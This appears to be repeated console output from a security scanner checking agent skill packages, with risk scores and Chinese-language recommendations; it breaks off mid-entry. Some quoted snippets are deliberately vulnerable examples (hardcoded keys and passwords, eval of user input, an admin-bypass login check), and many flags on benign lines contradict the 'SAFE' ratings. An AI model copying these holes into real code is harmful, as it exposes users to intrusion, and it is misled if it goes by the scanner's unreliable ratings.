    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 3
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/template-code-generator.json
Scanning: test-case-documentation

[*] Scanning Skill: test-case-documentation

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (31):
  [FILE001] in test-case-documentation/SKILL.md:69
    Pattern: Given: Valid email, username, and password
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:154
    Pattern: │   │   └── test_weak_password (unit)
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:259
    Pattern: Verify that a new user can successfully register with valid email, username, ...
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:270
    Pattern: "password": "SecurePass123!"
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:279
    Pattern: 5. Verify password is hashed (not plain text)
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:285
    Pattern: - `assert created_user.password != "SecurePass123!"`
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:290
    Pattern: - Password stored as hash
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:297
    Pattern: - `test_user_registration_with_weak_password` - Tests password validation
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:322
    Pattern: "password": "ValidPass123"
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:512
    Pattern: Given: A new user with valid email and password
    Confidence: MEDIUM
  and 21 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 31
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 31

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/test-case-documentation.html
Scanning: test-case-documentation

[*] Scanning Skill: test-case-documentation

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (31):
  [FILE001] in test-case-documentation/SKILL.md:69
    Pattern: Given: Valid email, username, and password
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:154
    Pattern: │   │   └── test_weak_password (unit)
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:259
    Pattern: Verify that a new user can successfully register with valid email, username, ...
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:270
    Pattern: "password": "SecurePass123!"
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:279
    Pattern: 5. Verify password is hashed (not plain text)
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:285
    Pattern: - `assert created_user.password != "SecurePass123!"`
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:290
    Pattern: - Password stored as hash
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:297
    Pattern: - `test_user_registration_with_weak_password` - Tests password validation
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:322
    Pattern: "password": "ValidPass123"
    Confidence: MEDIUM
  [FILE001] in test-case-documentation/SKILL.md:512
    Pattern: Given: A new user with valid email and password
    Confidence: MEDIUM
  and 21 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 31
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 31

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/test-case-documentation.json
Scanning: test-case-reducer

[*] Scanning Skill: test-case-reducer

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in test-case-reducer/SKILL.md:142
    Pattern: .set('Authorization', 'Bearer token')
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/test-case-reducer.html
Scanning: test-case-reducer

[*] Scanning Skill: test-case-reducer

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in test-case-reducer/SKILL.md:142
    Pattern: .set('Authorization', 'Bearer token')
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/test-case-reducer.json
Scanning: test-deduplicator

[*] Scanning Skill: test-deduplicator

[?] Risk Level: LOW (3.1/10)

[!] CRITICAL Issues (7):
  [FILE001] in test-deduplicator/references/deduplication_methodology.md:265
    Pattern: - Token-based similarity (difflib)
    Confidence: MEDIUM
  [FILE001] in test-deduplicator/scripts/semantic_analyzer.py:139
    Pattern: test_names = list(self.test_data.keys())
    Confidence: MEDIUM
  [FILE001] in test-deduplicator/scripts/deduplicator.py:109
    Pattern: test_names.update(self.coverage_data['coverage_contributions'].keys())
    Confidence: MEDIUM
  [FILE001] in test-deduplicator/scripts/coverage_analyzer.py:93
    Pattern: test_names = list(self.test_coverage.keys())
    Confidence: MEDIUM
  [FILE001] in test-deduplicator/scripts/coverage_analyzer.py:116
    Pattern: test_names = list(self.test_coverage.keys())
    Confidence: MEDIUM
  [FILE001] in test-deduplicator/scripts/coverage_analyzer.py:141
    Pattern: test_names = list(self.test_coverage.keys())
    Confidence: MEDIUM
  [FILE001] in test-deduplicator/scripts/coverage_analyzer.py:207
    Pattern: all_tests = list(self.test_coverage.keys())
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 6
  Critical Issues: 7
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 7

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/test-deduplicator.html
Scanning: test-deduplicator

[*] Scanning Skill: test-deduplicator

[?] Risk Level: LOW (3.1/10)

[!] CRITICAL Issues (7):
  [FILE001] in test-deduplicator/references/deduplication_methodology.md:265
    Pattern: - Token-based similarity (difflib)
    Confidence: MEDIUM
  [FILE001] in test-deduplicator/scripts/semantic_analyzer.py:139
    Pattern: test_names = list(self.test_data.keys())
    Confidence: MEDIUM
  [FILE001] in test-deduplicator/scripts/deduplicator.py:109
    Pattern: test_names.update(self.coverage_data['coverage_contributions'].keys())
    Confidence: MEDIUM
  [FILE001] in test-deduplicator/scripts/coverage_analyzer.py:93
    Pattern: test_names = list(self.test_coverage.keys())
    Confidence: MEDIUM
  [FILE001] in test-deduplicator/scripts/coverage_analyzer.py:116
    Pattern: test_names = list(self.test_coverage.keys())
    Confidence: MEDIUM
  [FILE001] in test-deduplicator/scripts/coverage_analyzer.py:141
    Pattern: test_names = list(self.test_coverage.keys())
    Confidence: MEDIUM
  [FILE001] in test-deduplicator/scripts/coverage_analyzer.py:207
    Pattern: all_tests = list(self.test_coverage.keys())
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 6
  Critical Issues: 7
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 7

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/test-deduplicator.json
Scanning: test-driven-generation

[*] Scanning Skill: test-driven-generation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/test-driven-generation.html
Scanning: test-driven-generation

[*] Scanning Skill: test-driven-generation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/test-driven-generation.json
Scanning: test-guided-bug-detector

[*] Scanning Skill: test-guided-bug-detector

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/test-guided-bug-detector.html
Scanning: test-guided-bug-detector

[*] Scanning Skill: test-guided-bug-detector

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/test-guided-bug-detector.json
Scanning: test-guided-debloating

[*] Scanning Skill: test-guided-debloating

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/test-guided-debloating.html
Scanning: test-guided-debloating

[*] Scanning Skill: test-guided-debloating

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/test-guided-debloating.json
Scanning: test-guided-migration-assistant

[*] Scanning Skill: test-guided-migration-assistant

[OK] Risk Level: SAFE (1.2/10)

[!] CRITICAL Issues (3):
  [FILE001] in test-guided-migration-assistant/references/migration_strategy.md:301
    Pattern: # Old: dict.keys() returns list
    Confidence: MEDIUM
  [FILE001] in test-guided-migration-assistant/references/migration_strategy.md:302
    Pattern: # New: dict.keys() returns dict_keys view
    Confidence: MEDIUM
  [FILE001] in test-guided-migration-assistant/references/migration_strategy.md:304
    Pattern: keys = list(my_dict.keys())
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 3
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/test-guided-migration-assistant.html
Scanning: test-guided-migration-assistant

[*] Scanning Skill: test-guided-migration-assistant

[OK] Risk Level: SAFE (1.2/10)

[!] CRITICAL Issues (3):
  [FILE001] in test-guided-migration-assistant/references/migration_strategy.md:301
    Pattern: # Old: dict.keys() returns list
    Confidence: MEDIUM
  [FILE001] in test-guided-migration-assistant/references/migration_strategy.md:302
    Pattern: # New: dict.keys() returns dict_keys view
    Confidence: MEDIUM
  [FILE001] in test-guided-migration-assistant/references/migration_strategy.md:304
    Pattern: keys = list(my_dict.keys())
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 3
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/test-guided-migration-assistant.json
Scanning: test-oracle-generator

[*] Scanning Skill: test-oracle-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/test-oracle-generator.html
Scanning: test-oracle-generator

[*] Scanning Skill: test-oracle-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/test-oracle-generator.json
Scanning: test-suite-prioritizer

[*] Scanning Skill: test-suite-prioritizer

[OK] Risk Level: SAFE (0.2/10)

[*] WARNING Issues (1):
  [CMD002] in test-suite-prioritizer/references/prioritization_algorithms.md:302
    Pattern: os.system(f'coverage json -o coverage.json')
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 1
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/test-suite-prioritizer.html
Scanning: test-suite-prioritizer

[*] Scanning Skill: test-suite-prioritizer

[OK] Risk Level: SAFE (0.2/10)

[*] WARNING Issues (1):
  [CMD002] in test-suite-prioritizer/references/prioritization_algorithms.md:302
    Pattern: os.system(f'coverage json -o coverage.json')
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 1
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/test-suite-prioritizer.json
Scanning: trace-collection-assistant

[*] Scanning Skill: trace-collection-assistant

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 9
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/trace-collection-assistant.html
Scanning: trace-collection-assistant

[*] Scanning Skill: trace-collection-assistant

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 9
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/trace-collection-assistant.json
Scanning: traceability-matrix-generator

[*] Scanning Skill: traceability-matrix-generator

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (27):
  [FILE001] in traceability-matrix-generator/SKILL.md:73
    Pattern: The system shall allow users to log in with email and password.
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:75
    Pattern: ## REQ-002: Password Reset
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:76
    Pattern: Users shall be able to reset forgotten passwords via email.
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:156
    Pattern: - Password reset workflow (REQ-002)
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:220
    Pattern: def authenticate_user(email, password):
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:227
    Pattern: password: User password
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:230
    Pattern: Authentication token if successful
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:250
    Pattern: * Password reset functionality
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:253
    Pattern: function resetPassword(email) {
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:373
    Pattern: | REQ-002 | Password Reset | Auth Service | auth/service.py::reset_password()...
    Confidence: MEDIUM
  and 17 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 27
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 27

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/traceability-matrix-generator.html
Scanning: traceability-matrix-generator

[*] Scanning Skill: traceability-matrix-generator

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (27):
  [FILE001] in traceability-matrix-generator/SKILL.md:73
    Pattern: The system shall allow users to log in with email and password.
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:75
    Pattern: ## REQ-002: Password Reset
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:76
    Pattern: Users shall be able to reset forgotten passwords via email.
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:156
    Pattern: - Password reset workflow (REQ-002)
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:220
    Pattern: def authenticate_user(email, password):
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:227
    Pattern: password: User password
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:230
    Pattern: Authentication token if successful
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:250
    Pattern: * Password reset functionality
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:253
    Pattern: function resetPassword(email) {
    Confidence: MEDIUM
  [FILE001] in traceability-matrix-generator/SKILL.md:373
    Pattern: | REQ-002 | Password Reset | Auth Service | auth/service.py::reset_password()...
    Confidence: MEDIUM
  and 17 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 27
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 27

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/traceability-matrix-generator.json
Scanning: unit-test-generator

[*] Scanning Skill: unit-test-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/unit-test-generator.html
Scanning: unit-test-generator

[*] Scanning Skill: unit-test-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/unit-test-generator.json
Scanning: verification-boundary-reporter

[*] Scanning Skill: verification-boundary-reporter

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/verification-boundary-reporter.html
Scanning: verification-boundary-reporter

[*] Scanning Skill: verification-boundary-reporter

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/verification-boundary-reporter.json
Scanning: verified-pseudocode-extractor

[*] Scanning Skill: verified-pseudocode-extractor

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/verified-pseudocode-extractor.html
Scanning: verified-pseudocode-extractor

[*] Scanning Skill: verified-pseudocode-extractor

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/verified-pseudocode-extractor.json
Scanning: verified-spec-code-mapper

[*] Scanning Skill: verified-spec-code-mapper

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/verified-spec-code-mapper.html
Scanning: verified-spec-code-mapper

[*] Scanning Skill: verified-spec-code-mapper

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/verified-spec-code-mapper.json
Scanning: vulnerability-pattern-matcher

[*] Scanning Skill: vulnerability-pattern-matcher

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (27):
  [NET001] in vulnerability-pattern-matcher/SKILL.md:297
    Pattern: response = requests.get(url)
    Confidence: MEDIUM
  [NET001] in vulnerability-pattern-matcher/SKILL.md:320
    Pattern: from urllib.parse import urlparse
    Confidence: MEDIUM
  [NET001] in vulnerability-pattern-matcher/SKILL.md:330
    Pattern: response = requests.get(url, timeout=5)
    Confidence: MEDIUM
  [FILE001] in vulnerability-pattern-matcher/SKILL.md:150
    Pattern: apiKey: "sk-1234567890abcdef",
    Confidence: MEDIUM
  [FILE001] in vulnerability-pattern-matcher/SKILL.md:151
    Pattern: dbPassword: "admin123",
    Confidence: MEDIUM
  [FILE001] in vulnerability-pattern-matcher/SKILL.md:175
    Pattern: apiKey: process.env.API_KEY,
    Confidence: MEDIUM
  [FILE001] in vulnerability-pattern-matcher/SKILL.md:176
    Pattern: dbPassword: process.env.DB_PASSWORD,
    Confidence: MEDIUM
  [FILE001] in vulnerability-pattern-matcher/SKILL.md:196
    Pattern: User-controlled data is directly inserted into DOM via innerHTML without enco...
    Confidence: MEDIUM
  [NET001] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:413
    Pattern: urllib.request.urlopen(url, context=context)
    Confidence: MEDIUM
  [NET001] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:487
    Pattern: response = requests.get(url)
    Confidence: MEDIUM
  and 17 more

[*] WARNING Issues (14):
  [CMD002] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:604
    Pattern: - User input in system(), exec(), shell commands
    Confidence: MEDIUM
  [CMD002] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:633
    Pattern: - eval(), exec() with user input
    Confidence: MEDIUM
  [INJ002] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:232
    Pattern: eval(userInput);
    Confidence: MEDIUM
  [INJ002] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:604
    Pattern: - User input in system(), exec(), shell commands
    Confidence: MEDIUM
  [INJ002] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:633
    Pattern: - eval(), exec() with user input
    Confidence: MEDIUM
  [INJ002] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:641
    Pattern: eval(user_code)
    Confidence: MEDIUM
  [OBF001] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:232
    Pattern: eval(userInput);
    Confidence: MEDIUM
  [OBF001] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:604
    Pattern: - User input in system(), exec(), shell commands
    Confidence: MEDIUM
  [OBF001] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:633
    Pattern: - eval(), exec() with user input
    Confidence: MEDIUM
  [OBF001] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:641
    Pattern: eval(user_code)
    Confidence: MEDIUM
  and 4 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 27
  Warning Issues: 14
  Info Issues: 0
  Total Issues: 41

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/vulnerability-pattern-matcher.html
Scanning: vulnerability-pattern-matcher

[*] Scanning Skill: vulnerability-pattern-matcher

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (27):
  [NET001] in vulnerability-pattern-matcher/SKILL.md:297
    Pattern: response = requests.get(url)
    Confidence: MEDIUM
  [NET001] in vulnerability-pattern-matcher/SKILL.md:320
    Pattern: from urllib.parse import urlparse
    Confidence: MEDIUM
  [NET001] in vulnerability-pattern-matcher/SKILL.md:330
    Pattern: response = requests.get(url, timeout=5)
    Confidence: MEDIUM
  [FILE001] in vulnerability-pattern-matcher/SKILL.md:150
    Pattern: apiKey: "sk-1234567890abcdef",
    Confidence: MEDIUM
  [FILE001] in vulnerability-pattern-matcher/SKILL.md:151
    Pattern: dbPassword: "admin123",
    Confidence: MEDIUM
  [FILE001] in vulnerability-pattern-matcher/SKILL.md:175
    Pattern: apiKey: process.env.API_KEY,
    Confidence: MEDIUM
  [FILE001] in vulnerability-pattern-matcher/SKILL.md:176
    Pattern: dbPassword: process.env.DB_PASSWORD,
    Confidence: MEDIUM
  [FILE001] in vulnerability-pattern-matcher/SKILL.md:196
    Pattern: User-controlled data is directly inserted into DOM via innerHTML without enco...
    Confidence: MEDIUM
  [NET001] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:413
    Pattern: urllib.request.urlopen(url, context=context)
    Confidence: MEDIUM
  [NET001] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:487
    Pattern: response = requests.get(url)
    Confidence: MEDIUM
  and 17 more

[*] WARNING Issues (14):
  [CMD002] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:604
    Pattern: - User input in system(), exec(), shell commands
    Confidence: MEDIUM
  [CMD002] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:633
    Pattern: - eval(), exec() with user input
    Confidence: MEDIUM
  [INJ002] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:232
    Pattern: eval(userInput);
    Confidence: MEDIUM
  [INJ002] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:604
    Pattern: - User input in system(), exec(), shell commands
    Confidence: MEDIUM
  [INJ002] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:633
    Pattern: - eval(), exec() with user input
    Confidence: MEDIUM
  [INJ002] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:641
    Pattern: eval(user_code)
    Confidence: MEDIUM
  [OBF001] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:232
    Pattern: eval(userInput);
    Confidence: MEDIUM
  [OBF001] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:604
    Pattern: - User input in system(), exec(), shell commands
    Confidence: MEDIUM
  [OBF001] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:633
    Pattern: - eval(), exec() with user input
    Confidence: MEDIUM
  [OBF001] in vulnerability-pattern-matcher/references/vulnerability_patterns.md:641
    Pattern: eval(user_code)
    Confidence: MEDIUM
  and 4 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 27
  Warning Issues: 14
  Info Issues: 0
  Total Issues: 41

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/vulnerability-pattern-matcher.json
Scanning: vulnerability-root-cause-analyzer

[*] Scanning Skill: vulnerability-root-cause-analyzer

[?] Risk Level: LOW (3.3/10)

[!] CRITICAL Issues (6):
  [FILE001] in vulnerability-root-cause-analyzer/references/vulnerability_patterns.md:86
    Pattern: if user.password == provided_password or user.is_admin:
    Confidence: MEDIUM
  [FILE001] in vulnerability-root-cause-analyzer/references/vulnerability_patterns.md:110
    Pattern: - Hardcoded keys or passwords
    Confidence: MEDIUM
  [FILE001] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:130
    Pattern: def login(username, password):
    Confidence: MEDIUM
  [FILE001] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:132
    Pattern: if user and user.password == hash(password):
    Confidence: MEDIUM
  [FILE001] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:139
    Pattern: **Root Cause:** Logic error allows admin bypass without password. Missing: pr...
    Confidence: MEDIUM
  [INJ001] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:90
    Pattern: - system(), popen(), exec() calls
    Confidence: MEDIUM

[*] WARNING Issues (4):
  [CMD002] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:90
    Pattern: - system(), popen(), exec() calls
    Confidence: MEDIUM
  [INJ002] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:90
    Pattern: - system(), popen(), exec() calls
    Confidence: MEDIUM
  [OBF001] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:90
    Pattern: - system(), popen(), exec() calls
    Confidence: MEDIUM
  [OBF002] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:90
    Pattern: - system(), popen(), exec() calls
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 6
  Warning Issues: 4
  Info Issues: 0
  Total Issues: 10

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/vulnerability-root-cause-analyzer.html
Scanning: vulnerability-root-cause-analyzer

[*] Scanning Skill: vulnerability-root-cause-analyzer

[?] Risk Level: LOW (3.3/10)

[!] CRITICAL Issues (6):
  [FILE001] in vulnerability-root-cause-analyzer/references/vulnerability_patterns.md:86
    Pattern: if user.password == provided_password or user.is_admin:
    Confidence: MEDIUM
  [FILE001] in vulnerability-root-cause-analyzer/references/vulnerability_patterns.md:110
    Pattern: - Hardcoded keys or passwords
    Confidence: MEDIUM
  [FILE001] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:130
    Pattern: def login(username, password):
    Confidence: MEDIUM
  [FILE001] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:132
    Pattern: if user and user.password == hash(password):
    Confidence: MEDIUM
  [FILE001] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:139
    Pattern: **Root Cause:** Logic error allows admin bypass without password. Missing: pr...
    Confidence: MEDIUM
  [INJ001] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:90
    Pattern: - system(), popen(), exec() calls
    Confidence: MEDIUM

[*] WARNING Issues (4):
  [CMD002] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:90
    Pattern: - system(), popen(), exec() calls
    Confidence: MEDIUM
  [INJ002] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:90
    Pattern: - system(), popen(), exec() calls
    Confidence: MEDIUM
  [OBF001] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:90
    Pattern: - system(), popen(), exec() calls
    Confidence: MEDIUM
  [OBF002] in vulnerability-root-cause-analyzer/references/analysis_strategies.md:90
    Pattern: - system(), popen(), exec() calls
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 6
  Warning Issues: 4
  Info Issues: 0
  Total Issues: 10

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/vulnerability-root-cause-analyzer.json
Scanning: awesome-claude-skills-SE-skills/appcircle-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/appcircle-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/appcircle-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-appcircle-automation.html
Scanning: awesome-claude-skills-SE-skills/appcircle-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/appcircle-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/appcircle-automation/SKILL.md:78
